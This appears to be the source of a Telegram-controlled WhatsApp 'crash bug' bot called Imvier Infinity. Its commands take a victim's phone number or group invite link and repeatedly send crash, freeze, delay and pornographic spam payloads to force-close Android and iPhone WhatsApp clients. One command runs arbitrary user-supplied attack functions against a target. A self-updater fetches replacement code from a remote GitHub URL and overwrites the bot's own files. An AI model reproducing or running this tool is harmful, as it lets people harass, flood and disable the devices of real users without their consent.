bot.action('/back', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

    const controlsMenu = `
<blockquote>『 𝙸𝙼𝚅𝙸𝙴𝚁 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈 』</blockquote>
⌬ 𝙰𝚞𝚝𝚑𝚘𝚛 : @Farrasreall
⌬ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗  : 4.5
⌬ 𝙲𝚑𝚊𝚗𝚎𝚕 : https://t.me/infoimvierinfinity
⌬ 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 : ${displayName}

<blockquote>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</blockquote>
⌬ 𝚂𝚎𝚗𝚍𝚎𝚛  : ${senderStatus}
⌬ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtimeStatus}
⌬ 𝙲𝚘𝚘𝚕𝚍𝚘𝚠𝚗 : ${cooldownStatus}
⌬ 𝙼𝚎𝚖𝚘𝚛𝚢 : ${memoryStatus}
`;

    const keyboard = [
        [
            { text: "『⚙️』 𝚂𝚎𝚝𝚝𝚒𝚗𝚐", callback_data: "/controls" },
        ],
        [
            { text: "『🚀』𝙲𝚛𝚊𝚜𝚑 𝙱𝚞𝚐", callback_data: "/bug" }
        ],
        [
            { text: "『✨』𝚂𝚞𝚙𝚙𝚘𝚛𝚝", callback_data: "/tqto" }
        ],
        [
            { text: "『📌』𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 𝙱𝚘𝚝", callback_data: "infomenu" }
        ]
    ];

    await ctx.editMessageCaption(controlsMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
});

bot.command("delayandro", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayandro 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Invisible Hard
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 999; i++) {
    await freezexdelay(sock, target);
    await sleep(300); 
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Invisible Hard
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("delayinvis", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayinvis 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Invisible (Testing) 
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 1; i++) {
    await BebasSpam(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Invisible (Testing) 
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("coursel", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /coursel 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Coursel
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 1; i++) {
    await SpamCorsel(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay Coursel
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("crashandroid", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashandroid 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Forclose Android
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 1; i++) {
    await crasVisiBle(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Forclose Android
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("betalats", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /betalats 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Forclose Beta Latest
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 30; i++) {
    await crashV5(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Forclose Beta Latest
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("stuklogo", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /stuklogo 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Stuk Logo Freze
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 50; i++) {
    await crashV5(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Stuk Logo Freze
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("chatfreze", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /chatfreze 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Freze Chat
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 999; i++) {
    await crashV2(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Freze Chat
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("delayvis", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayvis 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay No Tag Sw
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 1; i++) {
    await SpamDelay(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay No Tag Sw
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("lockinvis", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lockinvis 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay No Tag Sw
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 1; i++) {
    await LockSpam(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Delay No Tag Sw
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("crashios", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashios 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Crash Iphone Invisible
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 50; i++) {
   await LocationIos(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Crash Iphone Invisible
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("spambkp", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /spambkp 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Spam Bokep
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 100; i++) {
   await BokepLx(sock, target);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target   : ${q}
⌬ Result   : Delivered
⌬ Effect   : Spam Bokep
⌬ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});


bot.command("testfunction", checkWhatsAppConnection, async (ctx) => {
if (!await validatePremiumGroup(ctx)) return;
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `
\`\`\`js
 ⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target: ${q}
⌬ Type: Unknown Function
⌬ Status: Process
\`\`\``,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `
\`\`\`JS
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡
⌬ Target: ${q}
⌬ Type: Unknown Function
⌬ Status: Success
\`\`\``
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("crashgroup", async (ctx) => {
    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode *Group Only*. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
        if (!await isAuthorized(ctx)) return;
    if (!isCooldownAllowed(ctx)) return;
    if (!isWhatsAppConnected || !sock) {
        return ctx.reply("❌ WhatsApp tidak terhubung! Gunakan /connect terlebih dahulu.");
    }
    if (isCommandBlacklisted("evabula")) {
        return ctx.reply("⛔ Command ini sedang diblacklist oleh admin!");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply(
            "🪧 Format: /evabula <link> [jumlah_loop]\n\n" +
            "📌 Contoh:\n" +
            "• /evabula https://chat.whatsapp.com/xxxx — (default loop)\n" +
            "• /evabula https://chat.whatsapp.com/xxxx 100 — (custom 100x)",
            { parse_mode: "Markdown" }
        );
    }

    const link = args[1];
    // Validasi link WhatsApp
    const regex = /https?:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]{22}/i;
    if (!regex.test(link)) {
        return ctx.reply("❌ Link invite WhatsApp tidak valid!\nContoh: https://chat.whatsapp.com/xxxxxxxxxxxxxxxxxx");
    }

    const inviteCode = link.split("/").pop().split("?")[0];

    // Default loop
    let loopCount = 70;
    if (args.length >= 3) {
        const parsed = parseInt(args[2]);
        if (!isNaN(parsed) && parsed > 0) {
            loopCount = parsed;
        }
    }

    await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl(), {
        caption: `\`\`\`javascript
╭━━━ Sending Bug━━━⬣
│⌑ Target: https://chat.whatsapp.com/${inviteCode}
│⌑ User: ${ctx.from.first_name}
│⌑ Type: Fc Invisible
│⌑ Loop: ${loopCount} kali
│⌑ Status: Success
╰━━━━━━━━━━━━━━━⬣
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "⌜📱⌟ ☇ Target", url: `https://chat.whatsapp.com/${inviteCode}` }
            ]]
        }
    });

    try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        const groupId = groupInfo.id;
        const groupJid = groupId;

        if (!groupId) throw new Error("Tidak dapat mengambil ID grup");

        for (let i = 0; i < loopCount; i++) {
            await groupSt(sock, groupJid);
            await sleep(4000);
            console.log(chalk.red(`Executon By imvier ${i+1}/${loopCount} to ${groupId}`));
        }
    } catch (err) {
        console.error("Error:", err.message);
    }
});

// (CASE BUAT MENU BARU) //

// CODE AUTO UPTADE
const VERSION = "v3.5";
const GITHUB_RAW = "https://raw.githubusercontent.com/farrasganteng13637/Databaseupdate/main";
const CONFIG_URL = `${GITHUB_RAW}/config.json`;

async function fetchConfig() {
    const response = await fetch(CONFIG_URL + "?t=" + Date.now());
    return response.json();
}

async function fetchScript() {
    const response = await fetch(`${GITHUB_RAW}/index.js` + "?t=" + Date.now());
    return response.text();
}

async function fetchSecJs() {
    const response = await fetch(`${GITHUB_RAW}/sec.js` + "?t=" + Date.now());
    return response.text();
}

async function checkAndPullUpdate() {
    try {
        console.log("🔍 Checking for updates...");
        const config = await fetchConfig();
        
        if (config.allow_update === true && config.latest_version !== VERSION) {
            console.log(`🔄 Update found: ${config.latest_version} (current: ${VERSION})`);
            
            // Update index.js
            const newScript = await fetchScript();
            fs.copyFileSync(__filename, `index.js.bak`);
            fs.writeFileSync(__filename, newScript);
            
            // Update sec.js
            try {
                const newSecJs = await fetchSecJs();
                const secJsPath = path.join(__dirname, "sec.js");
                if (fs.existsSync(secJsPath)) {
                    fs.copyFileSync(secJsPath, `sec.js.bak`);
                }
                fs.writeFileSync(secJsPath, newSecJs);
                console.log("✅ sec.js juga diupdate");
            } catch (secErr) {
                console.log("⚠️ Gagal update sec.js:", secErr.message);
            }
            
            console.log("✅ Update downloaded! Restarting...");
            process.exit(0);
        } else if (config.allow_update === false) {
            console.log("🔒 Update sedang ditutup oleh developer");
        } else {
            console.log("✅ Already latest version");
        }
    } catch (err) {
        console.error("❌ Update check failed:", err.message);
    }
}

setInterval(checkAndPullUpdate, 6 * 60 * 60 * 1000);


// ========== COMMAND PULL UPDATE ==========
let isUpdating = false;

bot.command("pullupdate", async (ctx) => {
    if (ctx.from.id.toString() !== ownerID) return ctx.reply("❌ Akses owner!");
    if (isUpdating) return ctx.reply("⏳ Update sedang berjalan...");
    
    isUpdating = true;
    const msg = await ctx.reply(`
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ 🔄 Memeriksa update...
┃ File : index.js & sec.js
╰━──────────────────────━
</pre>
</blockquote>
    `, { parse_mode: "HTML" });
    
    try {
        const config = await fetchConfig();
        
        if (config.allow_update === false) {
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js & sec.js
┃ ❌ Tidak Bisa Pull Update
┃ Status: Update Ditutup Sementara
┃ Notes : Coba lagi nanti
╰━──────────────────────━
</pre>
</blockquote>            
            `, { parse_mode: "HTML" });
            isUpdating = false;
            return;
        }
        
        if (config.latest_version === VERSION) {
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js & sec.js
┃ ✅ Version sudah diperbarui!!
┃ Version: ${VERSION}
╰━──────────────────────━
</pre>
</blockquote>            
            `, { parse_mode: "HTML" });
            isUpdating = false;
            return;
        }
        
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js & sec.js
┃ 📥 Download File : ${config.latest_version}...
╰━──────────────────────━
</pre>
</blockquote>        
        `, { parse_mode: "HTML" });
        
        // Update index.js
        const newScript = await fetchScript();
        fs.copyFileSync(__filename, `index.js.bak`);
        fs.writeFileSync(__filename, newScript);
        
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js
┃ ✅ index.js berhasil diupdate
┃ 📥 Downloading sec.js...
╰━──────────────────────━
</pre>
</blockquote>            
        `, { parse_mode: "HTML" });
        
        // Update sec.js
        try {
            const newSecJs = await fetchSecJs();
            const secJsPath = path.join(__dirname, "sec.js");
            if (fs.existsSync(secJsPath)) {
                fs.copyFileSync(secJsPath, `sec.js.bak`);
            }
            fs.writeFileSync(secJsPath, newSecJs);
            
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : sec.js
┃ ✅ sec.js berhasil diupdate
╰━──────────────────────━
</pre>
</blockquote>            
            `, { parse_mode: "HTML" });
        } catch (secErr) {
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : sec.js
┃ ⚠️ Gagal update sec.js
┃ Error: ${secErr.message}
╰━──────────────────────━
</pre>
</blockquote>            
            `, { parse_mode: "HTML" });
        }
        
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js & sec.js
┃ ✅ Update Selesai!!
┃ ${VERSION} → ${config.latest_version}
┃ 🔄 Bot akan merestart server
╰━──────────────────────━
</pre>
</blockquote>          
        `, { parse_mode: "HTML" });
        
        setTimeout(() => process.exit(0), 2000);
        
    } catch (err) {
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `
<blockquote>
<pre>
╭━───━⊱ Update Script 
┃ File : index.js & sec.js
┃ ❌ Gagal update!!
┃ Error: ${err.message}
╰━──────────────────────━
</pre>
</blockquote>            
        `, { parse_mode: "HTML" });
        isUpdating = false;
    }
});

bot.command("grouponly", async (ctx) => {
    if (!isGroupOnlyAllowed(ctx)) {
        return ctx.reply("🚫 Bot sedang dalam mode Group Only. Command ini hanya bisa digunakan di dalam grup.\nHubungi owner untuk info lebih lanjut.", { parse_mode: "Markdown" });
    }
    if (ctx.from.id.toString() !== ownerID) {
        return ctx.reply("❌ Akses hanya untuk pemilik!");
    }
    
    const newStatus = toggleGroupOnly();
    const statusText = newStatus ? "ON (hanya grup)" : "OFF (bisa private chat & grup)";
    ctx.reply(`✅ Mode grouponly sekarang: ${statusText}`);
});

// ========== BLACKLIST SYSTEM ==========
const blacklistFile = "./database/blacklist.json";

if (!fs.existsSync("./database")) {
    fs.mkdirSync("./database", { recursive: true });
}

let blacklistCommands = { commands: [] };

if (fs.existsSync(blacklistFile)) {
    try {
        const data = fs.readFileSync(blacklistFile, 'utf8');
        blacklistCommands = JSON.parse(data);
